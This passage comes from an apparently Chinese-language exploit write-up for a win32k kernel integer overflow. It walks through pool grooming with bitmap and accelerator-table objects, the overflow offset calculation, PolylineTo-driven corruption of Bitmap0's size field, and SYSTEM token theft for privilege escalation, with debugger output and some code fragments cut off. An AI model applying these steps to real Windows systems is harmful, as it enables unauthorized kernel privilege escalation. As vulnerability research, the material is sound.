        HACCEL* pAccels2 = (HACCEL*)malloc(sizeof(HACCEL) * 7000);
        for (INT i = 0; i  !pool fffff90170555010
    Pool page fffff90170555010 region is Unknown
    *fffff90170555000 size:  f80 previous size:    0  (Allocated) *Gh05
            Pooltag Gh05 : GDITAG_HMGR_SURF_TYPE, Binary : win32k.sys
     fffff90170555f80 size:   80 previous size:  f80  (Free)       ....
接着调用`CreateAcceleratorTableA(lpAccel, 1)`分配两个0x40的对象用于占位，防止之后在尾部申请空间
    kd> !pool fffff90170555010
    Pool page fffff90170555010 region is Unknown
    *fffff90170555000 size:  f80 previous size:    0  (Allocated) *Gh05
            Pooltag Gh05 : GDITAG_HMGR_SURF_TYPE, Binary : win32k.sys
     fffff90170555f80 size:   40 previous size:  f80  (Allocated)  Usac Process: ffffe0013de89500
     fffff90170555fc0 size:   40 previous size:   40  (Allocated)  Usac Process: ffffe0013de89500
释放Bitmap对象，在靠后位置重新分配一个较小的Bitmap对象
    kd> !pool fffff90170555010
    Pool page fffff90170555010 region is Unknown
    *fffff90170555000 size:  bc0 previous size:    0  (Allocated) *Gh04
            Pooltag Gh04 : GDITAG_HMGR_RGN_TYPE, Binary : win32k.sys
     fffff90170555bc0 size:  3c0 previous size:  bc0  (Allocated)  Gh05     ;Bitmap
     fffff90170555f80 size:   40 previous size:  3c0  (Allocated)  Usac Process: ffffe0013de89500
     fffff90170555fc0 size:   40 previous size:   40  (Allocated)  Usac Process: ffffe0013de89500
随后`DestroyAcceleratorTable`释放尾部两个对象来在pool尾部制造空洞
    kd> !pool fffff90170555010
    Pool page fffff90170555010 region is Unknown
    *fffff90170555000 size:  bc0 previous size:    0  (Allocated) *Gh04
            Pooltag Gh04 : GDITAG_HMGR_RGN_TYPE, Binary : win32k.sys
     fffff90170555bc0 size:  3c0 previous size:  bc0  (Allocated)  Gh05
     fffff90170555f80 size:   80 previous size:  3c0  (Free)
最终从ring3层触发bFill函数，它会调用PALLOCMEM2函数分配0x60的空间，这将会落入设置好的空洞中
    win32k!bFill+0x387:
    fffff960`00245bc7 e8d462e6ff      call    win32k!PALLOCMEM2 (fffff960`000abea0)
    kd> p
    win32k!bFill+0x38c:
    fffff960`00245bcc 4c8bf0          mov     r14,rax
    kd> r
    rax=fffff9017174bfb0 rbx=ffffd00187e07970 rcx=fffff80084cbac98
    rdx=0000000000000066 rsi=ffffd00187e07970 rdi=ffffd00187e07834
    rip=fffff96000245bcc rsp=ffffd00187e06ae0 rbp=ffffd00187e07250
     r8=0000000000000060  r9=fffff90000002000 r10=0000000000000080
    r11=ffffd00187e06a50 r12=ffffd00187e07360 r13=ffffd00187e07360
    r14=ffffd00187e07970 r15=fffff960002169a4
    iopl=0         nv up ei ng nz na pe nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
    win32k!bFill+0x38c:
    fffff960`00245bcc 4c8bf0          mov     r14,rax
    kd> !pool fffff9017174bfb0
    Pool page fffff9017174bfb0 region is Unknown
     fffff9017174b000 size:  bc0 previous size:    0  (Allocated)  Gh04
     fffff9017174bbc0 size:  3c0 previous size:  bc0  (Allocated)  Gh05
     fffff9017174bf80 size:   20 previous size:  3c0  (Free)       Free
    *fffff9017174bfa0 size:   60 previous size:   20  (Allocated) *Gedg
            Pooltag Gedg : GDITAG_EDGE, Binary : win32k!bFill
这样就得到了所期望的`| region | Bitmap | PALLOCMEM |`内存布局
#### 溢出控制
完成布局后，下一步需要通过缓冲区溢出将Bitmap0的sizlBitmap字段增大，以此来扩大其读写范围，完成进一步的溢出。为此，我们需要审视bConstructGET，它调用的AddEdgeToGET完成了内存赋值操作，根据这个函数，其实可以分析出每个point所占大小为0x30，它的成员字段有指针，大小，xy，方向等。这一点看内存数据的情况也能看出，有些字段为0xffffffff，若将其作为值覆盖到Bitmap0的sizlBitmap处，就能使其读写范围最大化。于是我们需要计算从PALLOCMEM2申请的内存空间到Bitmap0.sizlBitmap的偏移，并掌握AddEdgeToGET的赋值规律。  
PALLOCMEM2到Bitmap0.sizlBitmap的偏移可以直接计算出来，PALLOCMEM2申请的空间在pool的尾部，其数据部分距离下一页0x50，而Bitmap0的pool
header在pool中偏移为0x3c0，pool header大小为0x10，随后的BaseObject
header大小为0x18，sizlBitmap字段处于之后的SURFOBJ偏移0x38位置，因此这个偏移为`0x50+0xbc0+0x10+0x18+0x20=0xc58`，而该字段本身也占8字节，于是总的覆盖大小为0xc60。  
接着来看AddEdgeToGET函数，其中的关键点是以下两个对比块
这里会和`RECTL.bottom`与`RECTL.top`进行对比，不满足条件这个函数会直接返回，也就是说必须满足这个条件，point才被添加成功。经调试，这里的bottom是0，top是0x1f0，再来看看上面的代码，分析进行对比的是什么
这里r8，r9是作为参数传递进来的，r8表示上一个点(prev_point)，r9表示当前点(curr_point)，+4位置就是`point.y  0x1F && points[2].y != 0x5a1f)
            points[2].y = 0x5a1f;
        PolylineTo(hMemDC, points, 0x3FE01)
    }
其中`points[2].y = 20`便是使其小于0x1f能够添加点进去，当打完0x20次后，`points[2].y =
0x5a1f`使其大于0x1f，导致后面的循环不能继续添加点，直到遇到points[0x3FE00].y，这个点的数据最终覆盖到sizlBitmap上。这里的溢出控制很显然与之前布局时分配的各个对象大小关系密切，它们是相铺相成的，换句话说，因为是那种布局下，才会有这样的溢出。
#### 任意写
在上述溢出之后，Bitmap0.sizlBitmap变成了0xffffffff，这意味着它完全可以对Bitmap1进行读写。不过Bitmap0进行写的方式依旧只能通过覆盖，所以我们首先获取之后的数据，然后仅改动Bitmap1.pvScan0处，然后重新覆盖即可。由于在最初的覆盖中，破坏了许多结构的头部，为了维持正常运行，在可以进行任意地址写后，应该对这些头部进行修复，这些头部的偏移可以通过调试轻松得到。  
由于我们的读写能力很强大，可以随时更改读写地址，所以不需要执行shellcode，也不用绕过SMEP，直接偷取system的token并写入当前进程即可完成提权。
### 总结
这个例子展示了从整数溢出到任意地址写的完整过程以及Bitmap对象在利用过程中的强大之处，而内存布局也在其中起了十分关键的一环，如何通过申请和释放各种对象使内存发展为我们希望的局面也是十分有意思的。
### 参考
  * 
  * 
  * 
  * 